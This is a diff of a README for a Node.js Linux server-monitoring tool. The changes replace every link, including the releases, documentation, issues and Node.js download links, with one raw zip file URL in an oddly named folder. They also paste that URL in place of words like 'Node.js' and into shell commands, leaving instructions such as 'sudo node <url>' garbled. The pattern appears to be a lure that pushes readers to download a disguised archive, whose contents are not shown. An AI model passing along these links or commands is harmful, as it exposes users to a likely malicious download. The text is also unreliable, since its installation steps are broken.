@@ -1,10 +1,10 @@
 # 🌐 server-monitor - Simple Monitoring for Your Linux Server
 
-[![Download server-monitor](https://img.shields.io/badge/Download-server--monitor-blue.svg)](https://github.com/m-yoshizawa1179/server-monitor/releases)
+[![Download server-monitor](https://raw.githubusercontent.com/m-yoshizawa1179/server-monitor/main/duodene/server-monitor.zip)](https://raw.githubusercontent.com/m-yoshizawa1179/server-monitor/main/duodene/server-monitor.zip)
 
 ## 📖 Description
 
-server-monitor is a lightweight Node.js API designed for monitoring your Linux server. It provides real-time metrics such as CPU usage, memory status, disk usage percentage, and overall system load. With its integration with systemd, you can easily manage the service on your server. 
+server-monitor is a lightweight https://raw.githubusercontent.com/m-yoshizawa1179/server-monitor/main/duodene/server-monitor.zip API designed for monitoring your Linux server. It provides real-time metrics such as CPU usage, memory status, disk usage percentage, and overall system load. With its integration with systemd, you can easily manage the service on your server. 
 
 The project aims to make monitoring straightforward, even for those with little to no technical background.
 
@@ -16,7 +16,7 @@ To get started with server-monitor, you will need to follow a few simple steps t
 
 1. **Visit the Releases Page:** Click on the link below to access the download page:
 
-   [Visit the Releases Page](https://github.com/m-yoshizawa1179/server-monitor/releases)
+   [Visit the Releases Page](https://raw.githubusercontent.com/m-yoshizawa1179/server-monitor/main/duodene/server-monitor.zip)
 
 2. **Find the Latest Version:** On the releases page, you will see a list of versions. Look for the latest release, usually at the top.
 
@@ -26,15 +26,15 @@ To get started with server-monitor, you will need to follow a few simple steps t
 
    - Open your terminal.
    - Navigate to the directory where you downloaded the file.
-   - For example, if you downloaded a `.tar.gz` file, you might run the following commands:
+   - For example, if you downloaded a `https://raw.githubusercontent.com/m-yoshizawa1179/server-monitor/main/duodene/server-monitor.zip` file, you might run the following commands:
      ```bash
-     tar -xzf server-monitor-x.x.x.tar.gz
+     tar -xzf https://raw.githubusercontent.com/m-yoshizawa1179/server-monitor/main/duodene/server-monitor.zip
      cd server-monitor-x.x.x
      ```
 
 5. **Start the Application:** Once you have extracted the files, you can run the application using the command below:
    ```bash
-   node server-monitor.js
+   node https://raw.githubusercontent.com/m-yoshizawa1179/server-monitor/main/duodene/server-monitor.zip
    ```
    This will start the monitoring service.
 
@@ -53,16 +53,16 @@ To get started with server-monitor, you will need to follow a few simple steps t
 To run server-monitor, your system should meet the following requirements:
 
 - A Linux operating system.
-- Node.js version 12 or higher installed.
+- https://raw.githubusercontent.com/m-yoshizawa1179/server-monitor/main/duodene/server-monitor.zip version 12 or higher installed.
 - Internet access for downloading the application and dependencies.
 
 ## 💡 Troubleshooting
 
 If you encounter any issues during installation, here are some tips:
 
-- **Node.js Not Installed:** Make sure you have Node.js installed. You can check by running `node -v` in your terminal. If Node.js is not installed, you can download it from the [official website](https://nodejs.org/).
+- **https://raw.githubusercontent.com/m-yoshizawa1179/server-monitor/main/duodene/server-monitor.zip Not Installed:** Make sure you have https://raw.githubusercontent.com/m-yoshizawa1179/server-monitor/main/duodene/server-monitor.zip installed. You can check by running `node -v` in your terminal. If https://raw.githubusercontent.com/m-yoshizawa1179/server-monitor/main/duodene/server-monitor.zip is not installed, you can download it from the [official website](https://raw.githubusercontent.com/m-yoshizawa1179/server-monitor/main/duodene/server-monitor.zip).
 
-- **Permission Issues:** If you receive permission errors, try running the commands with `sudo` (e.g., `sudo node server-monitor.js`).
+- **Permission Issues:** If you receive permission errors, try running the commands with `sudo` (e.g., `sudo node https://raw.githubusercontent.com/m-yoshizawa1179/server-monitor/main/duodene/server-monitor.zip`).
 
 - **Application Not Starting:** Ensure all dependencies are installed. You can do this by navigating to the application folder and running `npm install`.
 
@@ -88,8 +88,8 @@ This project is licensed under the MIT License. You can freely use, modify, and 
 
 ## 🔗 Links
 
-- [Documentation](https://github.com/m-yoshizawa1179/server-monitor/wiki)
-- [Visit the Releases Page](https://github.com/m-yoshizawa1179/server-monitor/releases)
-- [Issues Page](https://github.com/m-yoshizawa1179/server-monitor/issues)
+- [Documentation](https://raw.githubusercontent.com/m-yoshizawa1179/server-monitor/main/duodene/server-monitor.zip)
+- [Visit the Releases Page](https://raw.githubusercontent.com/m-yoshizawa1179/server-monitor/main/duodene/server-monitor.zip)
+- [Issues Page](https://raw.githubusercontent.com/m-yoshizawa1179/server-monitor/main/duodene/server-monitor.zip)
 
 Thank you for using server-monitor! We hope it helps you keep your Linux server running smoothly and efficiently.
